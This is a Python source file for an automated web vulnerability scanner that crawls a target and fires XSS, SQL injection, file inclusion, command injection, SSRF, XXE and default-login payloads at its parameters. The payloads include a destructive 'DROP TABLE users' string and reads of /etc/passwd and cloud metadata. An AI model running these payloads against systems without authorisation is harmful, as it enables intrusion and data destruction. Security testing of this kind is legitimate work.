"""
Advanced Web Vulnerability Scanner
Enhanced web application security testing with intelligent detection
"""

import json
import time
import asyncio
import aiohttp
from typing import List, Dict, Any, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs
from pathlib import Path
import re
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import hashlib

import sys
from pathlib import Path
sys.path.append(str(Path(__file__).parent.parent))

from core.exceptions import ScanningError, NetworkError
from core.logging import get_logger

@dataclass
class VulnerabilityFinding:
    """Structure for vulnerability findings"""
    vuln_type: str
    severity: str
    confidence: str
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""
    remediation: str = ""
    cwe_id: str = ""
    cvss_score: float = 0.0
    references: List[str] = None
    
    def __post_init__(self):
        if self.references is None:
            self.references = []

class AdvancedWebScanner:
    """Advanced web application vulnerability scanner"""
    
    def __init__(self, config: Dict[str, Any], logger=None):
        self.config = config
        self.logger = logger or get_logger()
        self.session = None
        self.findings = []
        self.crawled_urls = set()
        self.tested_parameters = set()
        
        # Enhanced payload sets for different vulnerability types
        self.xss_payloads = self._load_xss_payloads()
        self.sqli_payloads = self._load_sqli_payloads()
        self.lfi_payloads = self._load_lfi_payloads()
        self.csrf_tokens = set()
        
        # Advanced detection patterns
        self.error_patterns = {
            'sql': [
                r'SQL syntax.*MySQL',
                r'Warning.*mysql_.*',
                r'valid MySQL result',
                r'MySqlClient\.',
                r'PostgreSQL.*ERROR',
                r'Warning.*pg_.*',
                r'valid PostgreSQL result',
                r'Npgsql\.',
                r'Oracle error',
                r'Oracle.*Driver',
                r'Warning.*oci_.*',
                r'Microsoft Access Driver',
                r'Microsoft JET Database Engine',
                r'SQLServer JDBC Driver',
                r'SqlException',
                r'Oracle OCI driver',
                r'sqlite3.OperationalError',
            ],
            'xss': [
                r'<script[^>]*>.*?</script>',
                r'javascript:',
                r'on\w+\s*=',
                r'<img[^>]*onerror',
                r'<svg[^>]*onload',
            ],
            'lfi': [
                r'root:x:0:0:',
                r'\[drivers\]',
                r'\[boot loader\]',
                r'kernel\.dll',
                r'WINDOWS\\system32',
                r'Warning.*include',
                r'failed to open stream',
            ]
        }
    
    async def scan_target(self, target_url: str, scan_options: Dict[str, Any] = None) -> List[VulnerabilityFinding]:
        """Perform comprehensive web vulnerability scan"""
        if scan_options is None:
            scan_options = {}
        
        self.logger.info(f"Starting advanced web scan for: {target_url}")
        
        try:
            # Initialize session with advanced settings
            await self._initialize_session()
            
            # Phase 1: Reconnaissance and crawling
            await self._reconnaissance_phase(target_url, scan_options)
            
            # Phase 2: Authentication detection
            await self._detect_authentication(target_url)
            
            # Phase 3: Vulnerability testing
            await self._vulnerability_testing_phase(scan_options)
            
            # Phase 4: Advanced attacks
            await self._advanced_attacks_phase(scan_options)
            
            # Phase 5: Business logic testing
            await self._business_logic_testing(scan_options)
            
            return self.findings
            
        except Exception as e:
            raise ScanningError(f"Web scan failed: {e}")
        finally:
            if self.session:
                await self.session.close()
    
    async def _initialize_session(self):
        """Initialize HTTP session with advanced settings"""
        connector = aiohttp.TCPConnector(
            limit=100,
            limit_per_host=30,
            ttl_dns_cache=300,
            use_dns_cache=True,
            ssl=False  # For testing
        )
        
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers
        )
    
    async def _reconnaissance_phase(self, target_url: str, scan_options: Dict[str, Any]):
        """Perform reconnaissance and crawling"""
        self.logger.info("Phase 1: Reconnaissance and crawling")
        
        # Basic crawling
        await self._crawl_website(target_url, max_depth=scan_options.get('crawl_depth', 3))
        
        # Technology detection
        await self._detect_technologies(target_url)
        
        # Directory enumeration
        await self._enumerate_directories(target_url)
        
        # Parameter discovery
        await self._discover_parameters()
    
    async def _crawl_website(self, start_url: str, max_depth: int = 3):
        """Advanced website crawling with intelligent link discovery"""
        urls_to_crawl = [(start_url, 0)]
        crawled = set()
        
        while urls_to_crawl:
            current_url, depth = urls_to_crawl.pop(0)
            
            if current_url in crawled or depth > max_depth:
                continue
            
            try:
                async with self.session.get(current_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        crawled.add(current_url)
                        self.crawled_urls.add(current_url)
                        
                        # Extract links
                        links = self._extract_links(content, current_url)
                        for link in links:
                            if link not in crawled:
                                urls_to_crawl.append((link, depth + 1))
                        
                        # Extract forms and parameters
                        self._extract_forms_and_parameters(content, current_url)
                        
            except Exception as e:
                self.logger.debug(f"Failed to crawl {current_url}: {e}")
    
    def _extract_links(self, content: str, base_url: str) -> Set[str]:
        """Extract links from HTML content"""
        links = set()
        
        # Extract href attributes
        href_pattern = r'href=["\']([^"\']+)["\']'
        for match in re.finditer(href_pattern, content, re.IGNORECASE):
            link = match.group(1)
            absolute_link = urljoin(base_url, link)
            
            # Filter relevant links
            parsed = urlparse(absolute_link)
            if parsed.netloc == urlparse(base_url).netloc:
                links.add(absolute_link)
        
        return links
    
    def _extract_forms_and_parameters(self, content: str, url: str):
        """Extract forms and parameters from HTML content"""
        # Extract form parameters
        form_pattern = r'<form[^>]*>(.*?)</form>'
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
        
        for form_match in re.finditer(form_pattern, content, re.IGNORECASE | re.DOTALL):
            form_content = form_match.group(1)
            for input_match in re.finditer(input_pattern, form_content, re.IGNORECASE):
                param_name = input_match.group(1)
                self.tested_parameters.add((url, param_name))
    
    async def _detect_technologies(self, target_url: str):
        """Detect web technologies and frameworks"""
        try:
            async with self.session.get(target_url) as response:
                headers = response.headers
                content = await response.text()
                
                technologies = []
                
                # Server header analysis
                server = headers.get('Server', '').lower()
                if 'apache' in server:
                    technologies.append('Apache')
                elif 'nginx' in server:
                    technologies.append('Nginx')
                elif 'iis' in server:
                    technologies.append('IIS')
                
                # Framework detection
                if 'x-powered-by' in headers:
                    technologies.append(headers['x-powered-by'])
                
                # Content-based detection
                if 'wp-content' in content or 'wordpress' in content.lower():
                    technologies.append('WordPress')
                elif 'drupal' in content.lower():
                    technologies.append('Drupal')
                elif 'joomla' in content.lower():
                    technologies.append('Joomla')
                
                if technologies:
                    self.logger.info(f"Detected technologies: {', '.join(technologies)}")
                
        except Exception as e:
            self.logger.debug(f"Technology detection failed: {e}")
    
    async def _enumerate_directories(self, target_url: str):
        """Enumerate common directories and files"""
        common_paths = [
            '/admin', '/administrator', '/login', '/dashboard',
            '/api', '/v1', '/v2', '/graphql',
            '/config', '/configuration', '/settings',
            '/backup', '/backups', '/old', '/test',
            '/phpmyadmin', '/adminer', '/phpinfo.php',
            '/.env', '/.git', '/robots.txt', '/sitemap.xml'
        ]
        
        base_url = target_url.rstrip('/')
        
        for path in common_paths:
            try:
                test_url = base_url + path
                async with self.session.get(test_url) as response:
                    if response.status in [200, 403, 401]:
                        self.crawled_urls.add(test_url)
                        
                        if response.status == 200:
                            self.logger.info(f"Found accessible path: {test_url}")
                        elif response.status == 403:
                            self.logger.info(f"Found protected path: {test_url}")
                            
            except Exception:
                continue
    
    async def _discover_parameters(self):
        """Discover additional parameters using common parameter names"""
        common_params = [
            'id', 'user', 'page', 'file', 'path', 'url', 'redirect',
            'search', 'q', 'query', 'keyword', 'term',
            'username', 'password', 'email', 'token',
            'category', 'type', 'action', 'cmd', 'exec'
        ]
        
        for url in list(self.crawled_urls):
            for param in common_params:
                self.tested_parameters.add((url, param))
    
    async def _detect_authentication(self, target_url: str):
        """Detect authentication mechanisms"""
        auth_indicators = [
            '/login', '/signin', '/auth', '/oauth',
            'login.php', 'signin.php', 'auth.php'
        ]
        
        for indicator in auth_indicators:
            test_url = urljoin(target_url, indicator)
            try:
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        if any(term in content.lower() for term in ['password', 'login', 'signin']):
                            self.logger.info(f"Found authentication endpoint: {test_url}")
                            await self._test_authentication_bypass(test_url)
                            
            except Exception:
                continue
    
    async def _test_authentication_bypass(self, auth_url: str):
        """Test for authentication bypass vulnerabilities"""
        bypass_payloads = [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'admin', 'password': 'password'},
            {'username': 'admin', 'password': ''},
            {'username': "admin'--", 'password': 'anything'},
            {'username': "admin'/*", 'password': 'anything'},
        ]
        
        for payload in bypass_payloads:
            try:
                async with self.session.post(auth_url, data=payload) as response:
                    content = await response.text()
                    
                    # Check for successful authentication indicators
                    if any(indicator in content.lower() for indicator in ['dashboard', 'welcome', 'logout']):
                        finding = VulnerabilityFinding(
                            vuln_type="Authentication Bypass",
                            severity="High",
                            confidence="Medium",
                            url=auth_url,
                            payload=str(payload),
                            description="Potential authentication bypass detected",
                            remediation="Implement proper authentication validation",
                            cwe_id="CWE-287"
                        )
                        self.findings.append(finding)
                        
            except Exception:
                continue
    
    async def _vulnerability_testing_phase(self, scan_options: Dict[str, Any]):
        """Test for various vulnerability types"""
        self.logger.info("Phase 3: Vulnerability testing")
        
        # Test each parameter for different vulnerability types
        tasks = []
        
        for url, param in self.tested_parameters:
            if scan_options.get('test_xss', True):
                tasks.append(self._test_xss(url, param))
            if scan_options.get('test_sqli', True):
                tasks.append(self._test_sql_injection(url, param))
            if scan_options.get('test_lfi', True):
                tasks.append(self._test_lfi(url, param))
            if scan_options.get('test_command_injection', True):
                tasks.append(self._test_command_injection(url, param))
        
        # Execute tests concurrently with rate limiting
        semaphore = asyncio.Semaphore(10)  # Limit concurrent requests
        
        async def limited_task(task):
            async with semaphore:
                return await task
        
        await asyncio.gather(*[limited_task(task) for task in tasks], return_exceptions=True)
    
    async def _test_xss(self, url: str, parameter: str):
        """Test for Cross-Site Scripting vulnerabilities"""
        for payload in self.xss_payloads[:20]:  # Limit payload count
            try:
                test_url = f"{url}?{parameter}={payload}"
                
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check if payload is reflected
                        if payload in content:
                            # Verify it's actually executable
                            if any(pattern in content for pattern in ['<script', 'javascript:', 'onerror']):
                                confidence = "High"
                            else:
                                confidence = "Medium"
                            
                            finding = VulnerabilityFinding(
                                vuln_type="Cross-Site Scripting (XSS)",
                                severity="Medium",
                                confidence=confidence,
                                url=test_url,
                                parameter=parameter,
                                payload=payload,
                                evidence=content[:500],
                                description="XSS vulnerability detected - user input reflected without proper encoding",
                                remediation="Implement proper input validation and output encoding",
                                cwe_id="CWE-79"
                            )
                            self.findings.append(finding)
                            break  # Found vulnerability, no need to test more payloads
                            
            except Exception:
                continue
    
    async def _test_sql_injection(self, url: str, parameter: str):
        """Test for SQL injection vulnerabilities"""
        for payload in self.sqli_payloads[:15]:  # Limit payload count
            try:
                test_url = f"{url}?{parameter}={payload}"
                
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    
                    # Check for SQL error patterns
                    for pattern in self.error_patterns['sql']:
                        if re.search(pattern, content, re.IGNORECASE):
                            finding = VulnerabilityFinding(
                                vuln_type="SQL Injection",
                                severity="High",
                                confidence="High",
                                url=test_url,
                                parameter=parameter,
                                payload=payload,
                                evidence=content[:500],
                                description="SQL injection vulnerability detected",
                                remediation="Use parameterized queries and input validation",
                                cwe_id="CWE-89"
                            )
                            self.findings.append(finding)
                            return  # Found vulnerability, exit early
                            
            except Exception:
                continue
    
    async def _test_lfi(self, url: str, parameter: str):
        """Test for Local File Inclusion vulnerabilities"""
        for payload in self.lfi_payloads:
            try:
                test_url = f"{url}?{parameter}={payload}"
                
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check for LFI indicators
                        for pattern in self.error_patterns['lfi']:
                            if re.search(pattern, content, re.IGNORECASE):
                                finding = VulnerabilityFinding(
                                    vuln_type="Local File Inclusion",
                                    severity="High",
                                    confidence="High",
                                    url=test_url,
                                    parameter=parameter,
                                    payload=payload,
                                    evidence=content[:500],
                                    description="Local file inclusion vulnerability detected",
                                    remediation="Implement proper input validation and file access controls",
                                    cwe_id="CWE-22"
                                )
                                self.findings.append(finding)
                                return
                                
            except Exception:
                continue
    
    async def _test_command_injection(self, url: str, parameter: str):
        """Test for command injection vulnerabilities"""
        command_payloads = [
            '; whoami',
            '| whoami',
            '& whoami',
            '`whoami`',
            '$(whoami)',
            '; cat /etc/passwd',
            '| type C:\\windows\\system32\\drivers\\etc\\hosts'
        ]
        
        for payload in command_payloads:
            try:
                test_url = f"{url}?{parameter}={payload}"
                
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check for command execution indicators
                        if any(indicator in content.lower() for indicator in ['root:', 'administrator', 'uid=', 'gid=']):
                            finding = VulnerabilityFinding(
                                vuln_type="Command Injection",
                                severity="Critical",
                                confidence="High",
                                url=test_url,
                                parameter=parameter,
                                payload=payload,
                                evidence=content[:500],
                                description="Command injection vulnerability detected",
                                remediation="Implement proper input validation and avoid system calls",
                                cwe_id="CWE-78"
                            )
                            self.findings.append(finding)
                            return
                            
            except Exception:
                continue
    
    async def _advanced_attacks_phase(self, scan_options: Dict[str, Any]):
        """Perform advanced attack scenarios"""
        self.logger.info("Phase 4: Advanced attacks")
        
        # CSRF testing
        if scan_options.get('test_csrf', True):
            await self._test_csrf()
        
        # SSRF testing
        if scan_options.get('test_ssrf', True):
            await self._test_ssrf()
        
        # XXE testing
        if scan_options.get('test_xxe', True):
            await self._test_xxe()
    
    async def _test_csrf(self):
        """Test for Cross-Site Request Forgery vulnerabilities"""
        for url in self.crawled_urls:
            try:
                # Check for forms without CSRF protection
                async with self.session.get(url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Look for forms
                        form_pattern = r'<form[^>]*method=["\']post["\'][^>]*>(.*?)</form>'
                        for form_match in re.finditer(form_pattern, content, re.IGNORECASE | re.DOTALL):
                            form_content = form_match.group(1)
                            
                            # Check for CSRF token
                            if not re.search(r'csrf|token|_token', form_content, re.IGNORECASE):
                                finding = VulnerabilityFinding(
                                    vuln_type="Cross-Site Request Forgery (CSRF)",
                                    severity="Medium",
                                    confidence="Medium",
                                    url=url,
                                    description="Form without CSRF protection detected",
                                    remediation="Implement CSRF tokens for all state-changing operations",
                                    cwe_id="CWE-352"
                                )
                                self.findings.append(finding)
                                
            except Exception:
                continue
    
    async def _test_ssrf(self):
        """Test for Server-Side Request Forgery vulnerabilities"""
        ssrf_payloads = [
            'http://localhost:80',
            'http://127.0.0.1:22',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'file:///etc/passwd',
            'gopher://127.0.0.1:6379/_INFO'
        ]
        
        for url, param in self.tested_parameters:
            for payload in ssrf_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    
                    start_time = time.time()
                    async with self.session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        response_time = time.time() - start_time
                        
                        # Check for SSRF indicators
                        if response_time > 5:  # Delayed response might indicate internal request
                            content = await response.text()
                            if any(indicator in content.lower() for indicator in ['connection refused', 'timeout', 'internal']):
                                finding = VulnerabilityFinding(
                                    vuln_type="Server-Side Request Forgery (SSRF)",
                                    severity="High",
                                    confidence="Medium",
                                    url=test_url,
                                    parameter=param,
                                    payload=payload,
                                    description="Potential SSRF vulnerability detected",
                                    remediation="Implement URL validation and whitelist allowed hosts",
                                    cwe_id="CWE-918"
                                )
                                self.findings.append(finding)
                                
                except asyncio.TimeoutError:
                    # Timeout might indicate SSRF
                    continue
                except Exception:
                    continue
    
    async def _test_xxe(self):
        """Test for XML External Entity vulnerabilities"""
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'''
        
        for url in self.crawled_urls:
            try:
                headers = {'Content-Type': 'application/xml'}
                async with self.session.post(url, data=xxe_payload, headers=headers) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check for XXE indicators
                        if 'root:' in content or '/bin/' in content:
                            finding = VulnerabilityFinding(
                                vuln_type="XML External Entity (XXE)",
                                severity="High",
                                confidence="High",
                                url=url,
                                payload=xxe_payload,
                                evidence=content[:500],
                                description="XXE vulnerability detected",
                                remediation="Disable external entity processing in XML parsers",
                                cwe_id="CWE-611"
                            )
                            self.findings.append(finding)
                            
            except Exception:
                continue
    
    async def _business_logic_testing(self, scan_options: Dict[str, Any]):
        """Test for business logic vulnerabilities"""
        self.logger.info("Phase 5: Business logic testing")
        
        # Price manipulation testing
        await self._test_price_manipulation()
        
        # Race condition testing
        await self._test_race_conditions()
        
        # Authentication bypass testing
        await self._test_authentication_logic()
    
    async def _test_price_manipulation(self):
        """Test for price manipulation vulnerabilities"""
        price_params = ['price', 'amount', 'cost', 'total', 'subtotal']
        
        for url, param in self.tested_parameters:
            if any(price_param in param.lower() for price_param in price_params):
                # Test negative values
                negative_payloads = ['-1', '-0.01', '0', '0.00']
                
                for payload in negative_payloads:
                    try:
                        test_url = f"{url}?{param}={payload}"
                        async with self.session.get(test_url) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Check if negative values are accepted
                                if payload in content:
                                    finding = VulnerabilityFinding(
                                        vuln_type="Price Manipulation",
                                        severity="High",
                                        confidence="Medium",
                                        url=test_url,
                                        parameter=param,
                                        payload=payload,
                                        description="Application accepts negative price values",
                                        remediation="Implement proper business logic validation for price fields",
                                        cwe_id="CWE-840"
                                    )
                                    self.findings.append(finding)
                                    
                    except Exception:
                        continue
    
    async def _test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        # This is a simplified race condition test
        # In a real implementation, you'd want more sophisticated testing
        
        for url in list(self.crawled_urls)[:5]:  # Limit to first 5 URLs
            try:
                # Send multiple simultaneous requests
                tasks = [self.session.get(url) for _ in range(10)]
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Analyze responses for race condition indicators
                status_codes = [r.status for r in responses if hasattr(r, 'status')]
                
                if len(set(status_codes)) > 2:  # Varied responses might indicate race conditions
                    finding = VulnerabilityFinding(
                        vuln_type="Potential Race Condition",
                        severity="Medium",
                        confidence="Low",
                        url=url,
                        description="Inconsistent responses detected in concurrent requests",
                        remediation="Implement proper synchronization mechanisms",
                        cwe_id="CWE-362"
                    )
                    self.findings.append(finding)
                    
            except Exception:
                continue
    
    async def _test_authentication_logic(self):
        """Test authentication logic for bypasses"""
        # Test for privilege escalation and horizontal privilege escalation
        auth_urls = [url for url in self.crawled_urls if any(term in url.lower() for term in ['admin', 'user', 'profile', 'account'])]
        
        for url in auth_urls:
            try:
                # Test direct access to restricted areas
                async with self.session.get(url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check for admin/sensitive content without authentication
                        if any(term in content.lower() for term in ['admin panel', 'dashboard', 'user management']):
                            finding = VulnerabilityFinding(
                                vuln_type="Authentication Bypass",
                                severity="High",
                                confidence="Medium",
                                url=url,
                                description="Administrative interface accessible without authentication",
                                remediation="Implement proper authentication checks for all administrative functions",
                                cwe_id="CWE-287"
                            )
                            self.findings.append(finding)
                            
            except Exception:
                continue
    
    def _load_xss_payloads(self) -> List[str]:
        """Load XSS payloads from various sources"""
        base_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            '<iframe src=javascript:alert(1)></iframe>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            '<body onload=alert(1)>',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
        ]
        
        # Add encoded payloads
        encoded_payloads = []
        for payload in base_payloads[:10]:  # Limit encoding to first 10
            # URL encoding
            encoded_payloads.append(payload.replace('<', '%3C').replace('>', '%3E'))
            # HTML entity encoding
            encoded_payloads.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
        
        return base_payloads + encoded_payloads
    
    def _load_sqli_payloads(self) -> List[str]:
        """Load SQL injection payloads"""
        return [
            "'", '"', "1'", "1\"", "1' OR '1'='1", "1\" OR \"1\"=\"1",
            "' OR 1=1--", "\" OR 1=1--", "' OR 1=1#", "\" OR 1=1#",
            "1' UNION SELECT null--", "1\" UNION SELECT null--",
            "1' AND 1=2 UNION SELECT null,null--",
            "1\" AND 1=2 UNION SELECT null,null--",
            "'; DROP TABLE users--", "\"; DROP TABLE users--",
            "1' OR SLEEP(5)--", "1\" OR SLEEP(5)--",
            "1' WAITFOR DELAY '00:00:05'--",
            "1\" WAITFOR DELAY '00:00:05'--",
            "1' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "1\" OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
        ]
    
    def _load_lfi_payloads(self) -> List[str]:
        """Load Local File Inclusion payloads"""
        return [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/etc/passwd',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts',
            'php://filter/read=convert.base64-encode/resource=index.php',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
            'expect://id',
            '/proc/self/environ',
            '/proc/version',
            '/proc/cmdline',
        ]